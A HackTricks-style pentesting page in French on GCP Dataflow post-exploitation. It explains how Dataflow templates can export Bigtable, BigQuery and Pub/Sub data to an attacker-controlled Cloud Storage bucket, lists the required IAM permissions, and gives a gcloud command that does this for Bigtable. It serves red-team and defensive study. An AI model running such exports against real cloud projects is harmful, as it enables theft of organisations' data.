# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Pour plus d'informations sur Dataflow, voir :

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Using Dataflow to exfiltrate data from other services

**Permissions :** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (over a SA with access to source and sink)

Si vous avez le droit de créer des jobs Dataflow, vous pouvez utiliser des templates GCP Dataflow pour exporter des données depuis Bigtable, BigQuery, Pub/Sub et d'autres services vers des buckets GCS contrôlés par l'attaquant. Il s'agit d'une technique de post-exploitation puissante lorsque vous avez obtenu l'accès Dataflow — par exemple via le [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write).

> [!NOTE]
> Vous avez besoin de `iam.serviceAccounts.actAs` sur un service account disposant d'autorisations suffisantes pour lire la source et écrire vers le sink. Par défaut, le Compute Engine default SA est utilisé si non précisé.

#### Bigtable vers GCS

Voir [GCP - Bigtable Post Exploitation] — "Dump rows to your bucket" pour le modèle complet. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Export Bigtable to attacker-controlled bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery vers GCS

Des templates Dataflow existent pour exporter les données BigQuery. Utilisez le template approprié pour votre format cible (JSON, Avro, etc.) et pointez la sortie vers votre bucket.

#### Pub/Sub et sources de streaming

Les pipelines de streaming peuvent lire depuis Pub/Sub (ou d'autres sources) et écrire dans GCS. Lancez un job avec un template qui lit depuis la subscription Pub/Sub ciblée et écrit dans votre bucket contrôlé.

## Références

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
